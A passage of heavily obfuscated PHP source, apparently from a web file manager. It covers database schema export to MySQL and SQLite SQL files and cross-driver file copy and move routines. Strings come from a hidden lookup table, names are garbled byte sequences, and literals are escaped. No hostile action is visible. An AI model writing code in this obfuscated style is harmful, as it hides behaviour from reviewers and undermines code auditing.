implode($ŠêÎ½ºÇ[1132], $ÆØÇĞ£Å) . $ŠêÎ½ºÇ[58]; } private function sqlDecode($¿ĞÓÅÂ€, $ ßØ¼‰, $˜ÃèÀ’ = '') { $¨ÑıÂ¼ =& $_SERVER[º·Ï‹¥³]; $¿ĞÓÅÂ€ = str_replace(array($¨ÑıÂ¼[1129], $¨ÑıÂ¼[1130], $¨ÑıÂ¼[1131]), array($¨ÑıÂ¼[1128], $¨ÑıÂ¼[253], $¨ÑıÂ¼[393]), $¿ĞÓÅÂ€); if ($ ßØ¼‰ == $¨ÑıÂ¼[13]) { $¿ĞÓÅÂ€ = str_ireplace($¨ÑıÂ¼[1133], $¨ÑıÂ¼[59], $¿ĞÓÅÂ€); $¿ĞÓÅÂ€ = stripslashes($¿ĞÓÅÂ€); } return preg_replace($¨ÑıÂ¼[1134], $¨ÑıÂ¼[12], $¿ĞÓÅÂ€); if ($ ßØ¼‰ == $¨ÑıÂ¼[13]) { return $˜ÃèÀ’ != $¨ÑıÂ¼[1135] ? stripslashes($¿ĞÓÅÂ€) : $¿ĞÓÅÂ€; } if ($˜ÃèÀ’ == $¨ÑıÂ¼[1135]) { $¿ĞÓÅÂ€ = str_replace($¨ÑıÂ¼[1136], $¨ÑıÂ¼[121], stripslashes($¿ĞÓÅÂ€)); } return $¿ĞÓÅÂ€; } public function getSqlFile($ç†şóÒü = '') { $–İÊ—ä‰ =& $_SERVER[º·Ï‹¥³]; $øªøèÌ = $this->dbType(!0); $—êÅ„Ç = CONTROLLER_DIR . "\x69\156\163\164\141\154\x6c\x2f\x64\141\164\141\x2f{$øªøèÌ}\x2e\x73\x71\154"; $ú­ÊÍâ = file_get_contents($—êÅ„Ç); $ø‹²Æ÷‹ = $–İÊ—ä‰[1137] . ($øªøèÌ == $–İÊ—ä‰[855] ? $–İÊ—ä‰[1138] : $–İÊ—ä‰[1139]) . $–İÊ—ä‰[1140]; preg_match_all($ø‹²Æ÷‹, $ú­ÊÍâ, $¿Ø™Ú®‹); $‘¥É«¸Ğ = $¿Ø™Ú®‹[1]; $²¤àÍ†Æ = $this->model()->db(); $ÇğµÖ¿¨ = $²¤àÍ†Æ->getTables(); $‹½Àòš = TEMP_FILES . $–İÊ—ä‰[1141] . date($–İÊ—ä‰[263]) . $–İÊ—ä‰[8]; del_dir($‹½Àòš); mk_dir($‹½Àòš); $ı¼¶å–Ø = $‹½Àòš . $–İÊ—ä‰[1142]; $Ğğ½¯çÅ = $‹½Àòš . $–İÊ—ä‰[1143]; $ù†²Ö…Ï = $øªøèÌ == $–İÊ—ä‰[13] ? $–İÊ—ä‰[855] : $–İÊ—ä‰[13]; IO::copy(CONTROLLER_DIR . "\x69\156\163\x74\141\x6c\x6c\57\x64\141\x74\141\57{$ù†²Ö…Ï}\x2e\x73\161\x6c", $‹½Àòš); @touch($‹½Àòš . $øªøèÌ . $–İÊ—ä‰[839]); $Š»Êœ£æ = fopen($ı¼¶å–Ø, $–İÊ—ä‰[1116]); $¼Â•¢å” = fopen($Ğğ½¯çÅ, $–İÊ—ä‰[1116]); if ($øªøèÌ == $–İÊ—ä‰[13]) { $ÇğµÖ¿¨ = array_diff($ÇğµÖ¿¨, array($–İÊ—ä‰[831], $–İÊ—ä‰[832])); $–½ºÌÊ = array($–İÊ—ä‰[1144], $–İÊ—ä‰[1145], $–İÊ—ä‰[1146]); fwrite($¼Â•¢å”, implode(PHP_EOL, $–½ºÌÊ) . PHP_EOL . PHP_EOL); foreach ($ÇğµÖ¿¨ as $ä¦³½Ì) { $ÂØÏˆÅö = $this->sqlFromSqlite($ä¦³½Ì); if (!$ÂØÏˆÅö[$–İÊ—ä‰[13]]) { continue; } fwrite($¼Â•¢å”, $ÂØÏˆÅö[$–İÊ—ä‰[13]] . PHP_EOL . PHP_EOL); if (!in_array($ä¦³½Ì, $‘¥É«¸Ğ)) { fwrite($Š»Êœ£æ, $ÂØÏˆÅö[$–İÊ—ä‰[855]] . PHP_EOL . PHP_EOL); } } } else { foreach ($ÇğµÖ¿¨ as $ä¦³½Ì) { $ÂØÏˆÅö = $this->sqlFromMysql($ä¦³½Ì); if (!$ÂØÏˆÅö[$–İÊ—ä‰[855]]) { continue; } fwrite($Š»Êœ£æ, $ÂØÏˆÅö[$–İÊ—ä‰[855]] . PHP_EOL . PHP_EOL); if (!in_array($ä¦³½Ì, $‘¥É«¸Ğ)) { fwrite($¼Â•¢å”, $ÂØÏˆÅö[$–İÊ—ä‰[13]] . PHP_EOL . PHP_EOL); } } } fclose($Š»Êœ£æ); fclose($¼Â•¢å”); $ú­ÊÍâ = array($–İÊ—ä‰[855] => $ı¼¶å–Ø, $–İÊ—ä‰[13] => $Ğğ½¯çÅ); return $ç†şóÒü ? $ú­ÊÍâ[$ç†şóÒü] : $ú­ÊÍâ; } public function dbType($›®ğÄàİ = false) { $ñÕ£ä¿ =& $_SERVER[º·Ï‹¥³]; $¬ŠêØ‚µ = $›®ğÄàİ ? $GLOBALS[$ñÕ£ä¿[6]][$ñÕ£ä¿[21]] : $this->database; $¬ŠêØ‚µ = array_change_key_case($¬ŠêØ‚µ); $ñİ–„†‡ = $¬ŠêØ‚µ[$ñÕ£ä¿[1016]]; if ($ñİ–„†‡ == $ñÕ£ä¿[1013]) { $ú÷¢êÓÔ = explode($ñÕ£ä¿[4], $¬ŠêØ‚µ[$ñÕ£ä¿[1022]]); $ñİ–„†‡ = $ú÷¢êÓÔ[0]; } $éÛ…Íì = array($ñÕ£ä¿[1147] => $ñÕ£ä¿[13], $ñÕ£ä¿[961] => $ñÕ£ä¿[855]); if (isset($éÛ…Íì[$ñİ–„†‡])) { $ñİ–„†‡ = $éÛ…Íì[$ñİ–„†‡]; } return $ñİ–„†‡; } public function sqlFromMysql($Í¶¢üŞÛ, $Â—°ˆğ½ = '') { $‘õç®ß« =& $_SERVER[º·Ï‹¥³]; $ôÑ©åš = $this->model()->db(); $‰ä×Ş® = $ôÑ©åš->query($‘õç®ß«[1148] . $Í¶¢üŞÛ . $‘õç®ß«[445]); if (!$‰ä×Ş® || !$‰ä×Ş®[0]) { return !1; } $Š¹×àã† = _get($‰ä×Ş®[0], $‘õç®ß«[1149], $‘õç®ß«[12]); if (!$Š¹×àã†) { return !1; } $“ß¡ŒÀ½ = "\x44\x52\x4f\120\x20\124\101\102\114\x45\40\111\x46\40\x45\130\111\x53\x54\x53\x20\x60{$Í¶¢üŞÛ}\140\73" . PHP_EOL . $Š¹×àã† . $‘õç®ß«[74]; if ($Â—°ˆğ½ && $Â—°ˆğ½ == $‘õç®ß«[855]) { return $“ß¡ŒÀ½; } $İî•â— = array_change_key_case($GLOBALS[$‘õç®ß«[6]][$‘õç®ß«[21]]); $«ÒéœÆÈ = $İî•â—[$‘õç®ß«[1021]]; $­•¼’íÖ = $‘õç®ß«[1150] . $«ÒéœÆÈ . $‘õç®ß«[1151] . $Í¶¢üŞÛ . $‘õç®ß«[58]; $‚íïÎÕì = $‘õç®ß«[1152] . $Í¶¢üŞÛ . $‘õç®ß«[949]; $„ÑüüÎÖ = $ôÑ©åš->query($­•¼’íÖ); if (empty($„ÑüüÎÖ)) { $µ¸£Âò² = array($‘õç®ß«[855] => $‘õç®ß«[12], $‘õç®ß«[13] => $‘õç®ß«[12]); return $Â—°ˆğ½ ? $µ¸£Âò²[$Â—°ˆğ½] : $µ¸£Âò²; } $£§îë„ = $ôÑ©åš->query($‚íïÎÕì); $ÛóÄã¹ = $‘õç®ß«[12]; $Î˜³Ë„– = array(); foreach ($£§îë„ as $áÀ±è–) { if (!$ÛóÄã¹ && $áÀ±è–[$‘õç®ß«[1153]] == $‘õç®ß«[1154]) { $ÛóÄã¹ = $áÀ±è–[$‘õç®ß«[1155]]; } if (isset($Î˜³Ë„–[$áÀ±è–[$‘õç®ß«[1153]]])) { $Î˜³Ë„–[$áÀ±è–[$‘õç®ß«[1153]]][$‘õç®ß«[1156]][] = $áÀ±è–[$‘õç®ß«[1155]]; continue; } $Î˜³Ë„–[$áÀ±è–[$‘õç®ß«[1153]]] = array($‘õç®ß«[1157] => $áÀ±è–[$‘õç®ß«[1153]], $‘õç®ß«[1156] => array($áÀ±è–[$‘õç®ß«[1155]]), $‘õç®ß«[1158] => $áÀ±è–[$‘õç®ß«[1159]] == $‘õç®ß«[91] ? 0 : 1); } $æ¯Èò— = array(); foreach ($Î˜³Ë„– as $áÀ±è–) { $é¹¶Ôê = $áÀ±è–[$‘õç®ß«[1157]] == $‘õç®ß«[1154]; $ÏƒñÎâË = array($‘õç®ß«[1160], $áÀ±è–[$‘õç®ß«[1158]] == $‘õç®ß«[91] && !$é¹¶Ôê ? $‘õç®ß«[1161] : $‘õç®ß«[12], $‘õç®ß«[1162], $‘õç®ß«[1163] . $Í¶¢üŞÛ . $‘õç®ß«[11] . ($é¹¶Ôê ? $‘õç®ß«[1164] : $áÀ±è–[$‘õç®ß«[1157]]) . $‘õç®ß«[121], $‘õç®ß«[1165], $‘õç®ß«[121] . $Í¶¢üŞÛ . $‘õç®ß«[121], $‘õç®ß«[1166] . implode($‘õç®ß«[1167], $áÀ±è–[$‘õç®ß«[1156]]) . $‘õç®ß«[1168]); $æ¯Èò—[] = implode($‘õç®ß«[53], $ÏƒñÎâË) . $‘õç®ß«[74]; } $•¨ËÅë = array(); $ÆÕŞ‡ù€ = array($‘õç®ß«[1169] => $‘õç®ß«[1170], $‘õç®ß«[1170] => $‘õç®ß«[1170], $‘õç®ß«[339] => $‘õç®ß«[366], $‘õç®ß«[338] => $‘õç®ß«[366]); foreach ($„ÑüüÎÖ as $áÀ±è–) { $ÏƒñÎâË = array($‘õç®ß«[121] . $áÀ±è–[$‘õç®ß«[1171]] . $‘õç®ß«[121], isset($ÆÕŞ‡ù€[$áÀ±è–[$‘õç®ß«[1172]]]) ? $ÆÕŞ‡ù€[$áÀ±è–[$‘õç®ß«[1172]]] : $áÀ±è–[$‘õç®ß«[1173]], $áÀ±è–[$‘õç®ß«[1174]] == $‘õç®ß«[947] ? $‘õç®ß«[1175] : $‘õç®ß«[1176], $áÀ±è–[$‘õç®ß«[1171]] == $ÛóÄã¹ ? $‘õç®ß«[1177] : $‘õç®ß«[12], $áÀ±è–[$‘õç®ß«[998]] ? strtoupper(str_replace($‘õç®ß«[11], $‘õç®ß«[12], $áÀ±è–[$‘õç®ß«[998]])) : $‘õç®ß«[12]); $•¨ËÅë[] = trim(implode($‘õç®ß«[53], $ÏƒñÎâË)); } $úâÔ“ê = array($‘õç®ß«[1178] . $Í¶¢üŞÛ . $‘õç®ß«[1179], $‘õç®ß«[1180] . $Í¶¢üŞÛ . $‘õç®ß«[1181], implode($‘õç®ß«[50] . PHP_EOL, $•¨ËÅë), $‘õç®ß«[995]); $È“ˆ¼¶º = implode(PHP_EOL, array_merge($úâÔ“ê, $æ¯Èò—)); if ($Â—°ˆğ½ && $Â—°ˆğ½ == $‘õç®ß«[13]) { return $È“ˆ¼¶º; } $µ¸£Âò² = array($‘õç®ß«[855] => $“ß¡ŒÀ½, $‘õç®ß«[13] => $È“ˆ¼¶º); return $Â—°ˆğ½ ? $µ¸£Âò²[$Â—°ˆğ½] : $µ¸£Âò²; } public function sqlFromSqlite($’Ï®ÇôÒ, $©ˆƒ¼ò = '') { $ÙÔ­¬±¼ =& $_SERVER[º·Ï‹¥³]; $îƒò¹Ì¤ = $this->model()->db(); $ôêôšÏ´ = "\x50\x52\x41\107\115\x41\x20\x54\x41\102\x4c\x45\x5f\111\x4e\x46\117\x20\50\47{$’Ï®ÇôÒ}\47\x29"; $¶¼´¯´ = "\123\105\114\105\x43\x54\x20\x2a\x20\x46\122\117\115\x20\163\x71\x6c\151\x74\x65\x5f\155\x61\163\x74\145\x72\40\x57\110\x45\x52\x45\40\164\x62\154\x5f\156\141\x6d\x65\x20\75\40\x27{$’Ï®ÇôÒ}\47"; $ı¢¦á¢‚ = $îƒò¹Ì¤->query($ôêôšÏ´); if (empty($ı¢¦á¢‚)) { $·²îîÅ = array($ÙÔ­¬±¼[855] => $ÙÔ­¬±¼[12], $ÙÔ­¬±¼[13] => $ÙÔ­¬±¼[12]); return $©ˆƒ¼ò ? $·²îîÅ[$©ˆƒ¼ò] : $·²îîÅ; } $Ü¬•ÚÙ = $îƒò¹Ì¤->query($¶¼´¯´); $áİØàú³ = $Ö“Å‰ªó = array(); foreach ($Ü¬•ÚÙ as $ß°´õË®) { if ($ß°´õË®[$ÙÔ­¬±¼[33]] == $ÙÔ­¬±¼[331]) { $áİØàú³[] = $ß°´õË®[$ÙÔ­¬±¼[1182]]; } else { $Ö“Å‰ªó[$ß°´õË®[$ÙÔ­¬±¼[32]]] = $ß°´õË®[$ÙÔ­¬±¼[1182]]; } } $¹‚òò¥ş = array_merge(array($ÙÔ­¬±¼[1178] . $’Ï®ÇôÒ . $ÙÔ­¬±¼[121]), $áİØàú³, array_values($Ö“Å‰ªó)); $¹‚òò¥ş = implode($ÙÔ­¬±¼[74] . PHP_EOL, $¹‚òò¥ş) . $ÙÔ­¬±¼[74]; if ($©ˆƒ¼ò && $©ˆƒ¼ò == $ÙÔ­¬±¼[13]) { return $¹‚òò¥ş; } $¿çŞÒß® = array(); $Î½àÉò‚ = array($ÙÔ­¬±¼[1170] => $ÙÔ­¬±¼[1183], $ÙÔ­¬±¼[366] => $ÙÔ­¬±¼[1184]); $ú¥·…ˆÚ = $ÙÔ­¬±¼[12]; foreach ($ı¢¦á¢‚ as $ß°´õË®) { if ($ß°´õË®[$ÙÔ­¬±¼[57]] == $ÙÔ­¬±¼[91]) { $ú¥·…ˆÚ = $ß°´õË®[$ÙÔ­¬±¼[32]]; } $¤ºóì†÷ = array($ÙÔ­¬±¼[445] . $ß°´õË®[$ÙÔ­¬±¼[32]] . $ÙÔ­¬±¼[445], isset($Î½àÉò‚[$ß°´õË®[$ÙÔ­¬±¼[33]]]) ? $Î½àÉò‚[$ß°´õË®[$ÙÔ­¬±¼[33]]] : $ß°´õË®[$ÙÔ­¬±¼[33]], $ß°´õË®[$ÙÔ­¬±¼[35]] == $ÙÔ­¬±¼[91] ? $ÙÔ­¬±¼[1175] : $ÙÔ­¬±¼[1185] . $ß°´õË®[$ÙÔ­¬±¼[56]], $ß°´õË®[$ÙÔ­¬±¼[57]] == $ÙÔ­¬±¼[91] ? $ÙÔ­¬±¼[1186] : $ÙÔ­¬±¼[12]); $¿çŞÒß®[] = trim(implode($ÙÔ­¬±¼[53], $¤ºóì†÷)); } foreach ($Ö“Å‰ªó as $¢ÉÌ×Å => $šÄîªÕù) { $€¯³õöÂ = str_replace($ÙÔ­¬±¼[1187] . $’Ï®ÇôÒ . $ÙÔ­¬±¼[11], $ÙÔ­¬±¼[12], $¢ÉÌ×Å); $ãÏåş = str_replace(array($ÙÔ­¬±¼[121], $ÙÔ­¬±¼[1006]), $ÙÔ­¬±¼[445], substr($šÄîªÕù, stripos($šÄîªÕù, $ÙÔ­¬±¼[312]))); if ($€¯³õöÂ == $ÙÔ­¬±¼[1164]) { $¯²ÛÓî… = $ÙÔ­¬±¼[1188] . $ú¥·…ˆÚ . $ÙÔ­¬±¼[1189]; } else { $¯²ÛÓî… = (stripos($€¯³õöÂ, $ÙÔ­¬±¼[11]) ? $ÙÔ­¬±¼[1190] : $ÙÔ­¬±¼[12]) . ($ÙÔ­¬±¼[1191] . $€¯³õöÂ . $ÙÔ­¬±¼[1192] . $ãÏåş); } $¿çŞÒß®[] = $¯²ÛÓî…; } $Ä°Í•Ö¨ = array($ÙÔ­¬±¼[1193] . $’Ï®ÇôÒ . $ÙÔ­¬±¼[1194], $ÙÔ­¬±¼[1195] . $’Ï®ÇôÒ . $ÙÔ­¬±¼[1196], implode($ÙÔ­¬±¼[50] . PHP_EOL, $¿çŞÒß®), $ÙÔ­¬±¼[1197]); $ºÁş™Òß = implode(PHP_EOL, $Ä°Í•Ö¨); if ($©ˆƒ¼ò && $©ˆƒ¼ò == $ÙÔ­¬±¼[855]) { return $ºÁş™Òß; } $·²îîÅ = array($ÙÔ­¬±¼[855] => $ºÁş™Òß, $ÙÔ­¬±¼[13] => $¹‚òò¥ş); return $©ˆƒ¼ò ? $·²îîÅ[$©ˆƒ¼ò] : $·²îîÅ; } } class IO extends ClassBaseCall { public static $driverCache = array(); public static $driverListSystem = array(); public static $driverListUser = array(); public static function __callStatic($œ³à‡Öß, $²©İˆç…) { $óâßÎ±Ô =& $_SERVER[º·Ï‹¥³]; $‹´Î Í¸ = $²©İˆç…; $GLOBALS[$óâßÎ±Ô[1198]] = $óâßÎ±Ô[1199] . $œ³à‡Öß; Hook::trigger($óâßÎ±Ô[1199] . $œ³à‡Öß . $óâßÎ±Ô[1200], $‹´Î Í¸); $’§Ğ¬‘” = self::driverMake($²©İˆç…[0]); if (!$’§Ğ¬‘”) { return !1; } if (method_exists($’§Ğ¬‘”, $œ³à‡Öß)) { $¼„îü˜à = @call_user_func_array(array($’§Ğ¬‘”, $œ³à‡Öß), $²©İˆç…); } else { if (method_exists($’§Ğ¬‘”, $óâßÎ±Ô[1201])) { $¼„îü˜à = @call_user_func_array(array($’§Ğ¬‘”, $œ³à‡Öß), $²©İˆç…); } else { if (method_exists(self, $œ³à‡Öß)) { $¼„îü˜à = @call_user_func_array(array(self, $œ³à‡Öß), $²©İˆç…); } else { $¼„îü˜à = call_user_func_array(array(parent, $œ³à‡Öß), $²©İˆç…); } } } Hook::trigger($óâßÎ±Ô[1199] . $œ³à‡Öß . $óâßÎ±Ô[1202], $‹´Î Í¸, $¼„îü˜à); return $¼„îü˜à; } public static function init($Æå¬ü‰) { return self::driverMake($Æå¬ü‰); } public static function copy($ùŸÀÂ›‡, $­’óˆÄ“, $Ñùá Ÿ = false, $ÌÇâ†áá = false) { return self::copyMoveStart($ùŸÀÂ›‡, $­’óˆÄ“, $Ñùá Ÿ, $_SERVER[º·Ï‹¥³][602], $ÌÇâ†áá); } public static function move($Àğ¾õ¨€, $¦¨…ºÃ, $ä­ó‡úè = false, $ÌÚÔÙÈ = false) { return self::copyMoveStart($Àğ¾õ¨€, $¦¨…ºÃ, $ä­ó‡úè, $_SERVER[º·Ï‹¥³][604], $ÌÚÔÙÈ); } private static function copyMoveStart($øÄ‘€É, $Ö¬™Ìâè, $ßØ×ËØû, $Ü¼ü¦©Â, $‹Ò²º á) { $„“ö©Üà =& $_SERVER[º·Ï‹¥³]; $ã²èœ¼ = array($øÄ‘€É, $Ö¬™Ìâè, $ßØ×ËØû, $‹Ò²º á); Hook::trigger($„“ö©Üà[1199] . $Ü¼ü¦©Â . $„“ö©Üà[1200], $ã²èœ¼); $ùµüÚûÕ = self::copyMove($øÄ‘€É, $Ö¬™Ìâè, $ßØ×ËØû, $Ü¼ü¦©Â, $‹Ò²º á); Hook::trigger($„“ö©Üà[1199] . $Ü¼ü¦©Â . $„“ö©Üà[1202], $ã²èœ¼, $ùµüÚûÕ); return $ùµüÚûÕ; } public static function saveFile($üÕºâ‚í, $ã¯ÌÜüµ, $¦Û£âï¶ = true) { $ƒşç»» =& $_SERVER[º·Ï‹¥³]; $ùáŸˆË¾ = self::info($ã¯ÌÜüµ); $Ğ‰…¹âı = self::driverMake($üÕºâ‚í); $Şé…ñÎƒ = self::driverMake($ã¯ÌÜüµ); $Š¼ış–À = !1; if ($Şé…ñÎƒ->pathParse[$ƒşç»»[1203]]) { $Š¼ış–À = $Şé…ñÎƒ; $ï±¸¸ = $Şé…ñÎƒ->pathParse[$ƒşç»»[1203]]; $Şé…ñÎƒ = self::driverMake($ï±¸¸); } if ($Ğ‰…¹âı->pathParse[$ƒşç»»[1203]]) { $»âê§Á = $Ğ‰…¹âı->pathParse[$ƒşç»»[1203]]; $Ğ‰…¹âı = self::driverMake($»âê§Á); } $äÅ£Íª = $Şé…ñÎƒ->pathFather($ã¯ÌÜüµ); $¨ÂäÁ®… = !0; if (!$¦Û£âï¶ && self::driverIsSame($Ğ‰…¹âı, $Şé…ñÎƒ)) { $¨ÂäÁ®… = !1; } $éßúöá² = self::copyFile($Ğ‰…¹âı, $üÕºâ‚í, $Şé…ñÎƒ, $äÅ£Íª, $ùáŸˆË¾[$ƒşç»»[32]], $¨ÂäÁ®…); if ($Š¼ış–À) { $éßúöá² = $Š¼ış–À->getPathOuter($éßúöá²); } return $éßúöá²; } private static function copyMove($·×ÀìÒº, $¤„â¢óÕ, $·áâú»¦, $¦şİàñÒ, $ïğ®ñê = false) { $Ñ‚Ì¹·Ä =& $_SERVER[º·Ï‹¥³]; if (!$·×ÀìÒº || $·×ÀìÒº == $Ñ‚Ì¹·Ä[8] || !$¤„â¢óÕ) { return !1; } ignore_timeout(); $˜Ò—ºé‰ = self::driverMake($·×ÀìÒº); $ğª¥ÊÙ = self::driverMake($¤„â¢óÕ); $³¹Ôâè = $¦şİàñÒ == $Ñ‚Ì¹·Ä[604]; $¼û«Ğ®Ğ = !1; if ($ğª¥ÊÙ->pathParse[$Ñ‚Ì¹·Ä[1203]]) { $¼û«Ğ®Ğ = $ğª¥ÊÙ; $¤„â¢óÕ = $ğª¥ÊÙ->pathParse[$Ñ‚Ì¹·Ä[1203]]; $ğª¥ÊÙ = self::driverMake($¤„â¢óÕ); } if ($˜Ò—ºé‰->pathParse[$Ñ‚Ì¹·Ä[1203]]) { $·×ÀìÒº = $˜Ò—ºé‰->pathParse[$Ñ‚Ì¹·Ä[1203]]; $˜Ò—ºé‰ = self::driverMake($·×ÀìÒº); } self::check($˜Ò—ºé‰, $·×ÀìÒº, $ğª¥ÊÙ, $¤„â¢óÕ); Hook::trigger($Ñ‚Ì¹·Ä[1204], $˜Ò—ºé‰, $·×ÀìÒº, $ğª¥ÊÙ, $¤„â¢óÕ); $ÎşŸ‘ƒö = self::driverIsSame($˜Ò—ºé‰, $ğª¥ÊÙ); if ($ÎşŸ‘ƒö) { if ($¦şİàñÒ == $Ñ‚Ì¹·Ä[604] && !method_exists($ğª¥ÊÙ, $Ñ‚Ì¹·Ä[1205]) && trim($¤„â¢óÕ, $Ñ‚Ì¹·Ä[8]) == trim($ğª¥ÊÙ->pathFather($·×ÀìÒº), $Ñ‚Ì¹·Ä[8])) { if ($˜Ò—ºé‰->pathThis($·×ÀìÒº) != $ïğ®ñê && !$˜Ò—ºé‰->isOsDriver()) { return $˜Ò—ºé‰->rename($·×ÀìÒº, $ïğ®ñê); } return $ğª¥ÊÙ->getPathOuter($·×ÀìÒº); } if (method_exists($ğª¥ÊÙ, $¦şİàñÒ)) { return $ğª¥ÊÙ->{$¦şİàñÒ}($·×ÀìÒº, $¤„â¢óÕ, $·áâú»¦, $ïğ®ñê); } } if ($ÎşŸ‘ƒö && $¦şİàñÒ == $Ñ‚Ì¹·Ä[604] && $ğª¥ÊÙ->getType() == $Ñ‚Ì¹·Ä[109]) { $«éšÛôø = $ğª¥ÊÙ->movePath($·×ÀìÒº, $¤„â¢óÕ, $ïğ®ñê); if ($«éšÛôø) { return $«éšÛôø; } } $òìÌé²¸ = $˜Ò—ºé‰->isFile($·×ÀìÒº); if (!$òìÌé²¸ && $ğª¥ÊÙ->getType() == $Ñ‚Ì¹·Ä[809] && $˜Ò—ºé‰->getType() == $Ñ‚Ì¹·Ä[109]) { $«éšÛôø = $ğª¥ÊÙ->copyFolderFromIO($˜Ò—ºé‰, $·×ÀìÒº, $¤„â¢óÕ, $·áâú»¦, $³¹Ôâè, $ïğ®ñê); } else { $«éšÛôø = self::copyPath($˜Ò—ºé‰, $·×ÀìÒº, $ğª¥ÊÙ, $¤„â¢óÕ, $·áâú»¦, $³¹Ôâè, $òìÌé²¸, $ïğ®ñê); } if ($«éšÛôø && $³¹Ôâè) { $˜Ò—ºé‰->remove($·×ÀìÒº); } if ($¼û«Ğ®Ğ) { $«éšÛôø = $¼û«Ğ®Ğ->getPathOuter($«éšÛôø); } return $«éšÛôø; } private static function check($‡¨ëï®ë, $µªšõËı, $ïÍ¾øç‡, &$‡úÏÛ) { $ü¬šø„ =& $_SERVER[º·Ï‹¥³]; if (self::driverIsSame($‡¨ëï®ë, $ïÍ¾øç‡) && $‡¨ëï®ë->isFolder($µªšõËı) && $‡¨ëï®ë->isParentOf($µªšõËı, $‡úÏÛ)) { show_json(LNG($ü¬šø„[1206]), !1); } if (!$‡¨ëï®ë->exist($µªšõËı)) { show_json(LNG($ü¬šø„[108]), !1); } } private static function copyPath($§òª÷š, $·æüÊ, $°ÎÒéÁ‚, $ ¼§±“—, $ÃÂˆÔ´, $¸øİŞß, $¨–Ú÷‹ó, $©ëƒ“îá = false, $âï¸‡µí = true) { $‡¥×à®È =& $_SERVER[º·Ï‹¥³]; $˜ëùåŞ = empty($©ëƒ“îá) && $©ëƒ“îá !== $‡¥×à®È[219] ? $§òª÷š->pathThis($·æüÊ) : $©ëƒ“îá; if ($ÃÂˆÔ´) { $‘Å§æÁ = $°ÎÒéÁ‚->fileNameExist($ ¼§±“—, $˜ëùåŞ); $Ùôš„ªğ = $˜ëùåŞ; $˜ëùåŞ = $°ÎÒéÁ‚->fileNameAuto($ ¼§±“—, $˜ëùåŞ, $ÃÂˆÔ´, !$¨–Ú÷‹ó); if (!$‘Å§æÁ || $Ùôš„ªğ != $˜ëùåŞ) { $ÃÂˆÔ´ = !1; } if ($âï¸‡µí && !$ÃÂˆÔ´) { $°ÎÒéÁ‚->_data[$‡¥×à®È[1207]] = !0; } } if ($¨–Ú÷‹ó) { return self::copyFile($§òª÷š, $·æüÊ, $°ÎÒéÁ‚, $ ¼§±“—, $˜ëùåŞ, $¸øİŞß); } if ($ÃÂˆÔ´ == REPEAT_RENAME_FOLDER) { $ÃÂˆÔ´ = !1; } $‘ÍŞÈğ = rtrim($ ¼§±“—, $‡¥×à®È[8]) . $‡¥×à®È[8] . $˜ëùåŞ; $¦š¬šÊÏ = $°ÎÒéÁ‚->mkdir($°ÎÒéÁ‚->getPath($‘ÍŞÈğ), $ÃÂˆÔ´); $ ¼§±“— = $°ÎÒéÁ‚->getPathInner($¦š¬šÊÏ); $ğ‡¸ãÂñ = $§òª÷š->listPath($·æüÊ, !0); $ğ‡¸ãÂñ = is_array($ğ‡¸ãÂñ) ? $ğ‡¸ãÂñ : array($‡¥×à®È[86] => array(), $‡¥×à®È[85] => array()); $âúªß›é = array_merge($ğ‡¸ãÂñ[$‡¥×à®È[86]], $ğ‡¸ãÂñ[$‡¥×à®È[85]]); foreach ($âúªß›é as $§€³Ø²) { $ä›ºôĞ = $§€³Ø²[$‡¥×à®È[33]] == $‡¥×à®È[221]; $·æüÊ = $§òª÷š->getPathInner($§€³Ø²[$‡¥×à®È[87]]); $êäüí = self::copyPath($§òª÷š, $·æüÊ, $°ÎÒéÁ‚, $ ¼§±“—, $ÃÂˆÔ´, $¸øİŞß, $ä›ºôĞ, !1, !1); if (!$êäüí) { IO::errorTips($‡¥×à®È[1208] . $·æüÊ . $‡¥×à®È[73] . $ ¼§±“—); } } self::copyMoveKeepInfo($§òª÷š, $·æüÊ, $¦š¬šÊÏ); return $¦š¬šÊÏ; } private static function copyFile($•Ñ‚”Ê«, $òõ‡«ˆˆ, $¶ÈÜóĞ¿, $Ìäåí‡, $ì”åñé½, $Óµ³†ç¸) { $µï›ÓÑİ =& $_SERVER[º·Ï‹¥³]; $Ìäåí‡ = $¶ÈÜóĞ¿->getPath(rtrim($Ìäåí‡, $µï›ÓÑİ[8]) . $µï›ÓÑİ[8] . $ì”åñé½); $‰ÄÍ¶ë† = $µï›ÓÑİ[1209] . time() . rand_string(5); Hook::trigger($µï›ÓÑİ[1210], $•Ñ‚”Ê«, $òõ‡«ˆˆ, $¶ÈÜóĞ¿, $Ìäåí‡, $ì”åñé½, $‰ÄÍ¶ë†); if (self::driverIsSame($•Ñ‚”Ê«, $¶ÈÜóĞ¿)) { if ($Óµ³†ç¸) { $«Îê¼Á¶ = $¶ÈÜóĞ¿->moveFile($òõ‡«ˆˆ, $Ìäåí‡); } else { $«Îê¼Á¶ = $¶ÈÜóĞ¿->copyFile($òõ‡«ˆˆ, $Ìäåí‡); } Hook::trigger($µï›ÓÑİ[1211], $•Ñ‚”Ê«, $òõ‡«ˆˆ, $¶ÈÜóĞ¿, $Ìäåí‡, $ì”åñé½, $«Îê¼Á¶); self::copyMoveKeepInfo($•Ñ‚”Ê«, $òõ‡«ˆˆ, $«Îê¼Á¶); return $«Îê¼Á¶; } $ı¨Û„¦¼ = TEMP_FILES; if ($GLOBALS[$µï›ÓÑİ[6]][$µï›ÓÑİ[92]][$µï›ÓÑİ[847]]) { $ı¨Û„¦¼ = $GLOBALS[$µï›ÓÑİ[6]][$µï›ÓÑİ[92]][$µï›ÓÑİ[847]]; } $Ã®±Ñ­ö = $ı¨Û„¦¼; mk_dir($Ã®±Ñ­ö); $ª¦Ü¾Ü‡ = $Ã®±Ñ­ö . $‰ÄÍ¶ë†; $½†ĞÆ™ = $ª¦Ü¾Ü‡; $ª¦Ü¾Ü‡ = $•Ñ‚”Ê«->download($òõ‡«ˆˆ, $ª¦Ü¾Ü‡); $ª¦Ü¾Ü‡ = $•Ñ‚”Ê«->iconvApp($ª¦Ü¾Ü‡); if (substr($ª¦Ü¾Ü‡, strlen($ı¨Û„¦¼)) == $ı¨Û„¦¼) { $Óµ³†ç¸ = !0; } $«Îê¼Á¶ = $¶ÈÜóĞ¿->upload($Ìäåí‡, $ª¦Ü¾Ü‡, $Óµ³†ç¸); self::remove($½†ĞÆ™); Hook::trigger($µï›ÓÑİ[1211], $•Ñ‚”Ê«, $òõ‡«ˆˆ, $¶ÈÜóĞ¿, $Ìäåí‡, $ì”åñé½, $«Îê¼Á¶); self::copyMoveKeepInfo($•Ñ‚”Ê«, $òõ‡«ˆˆ, $«Îê¼Á¶); return $«Îê¼Á¶; } private static function 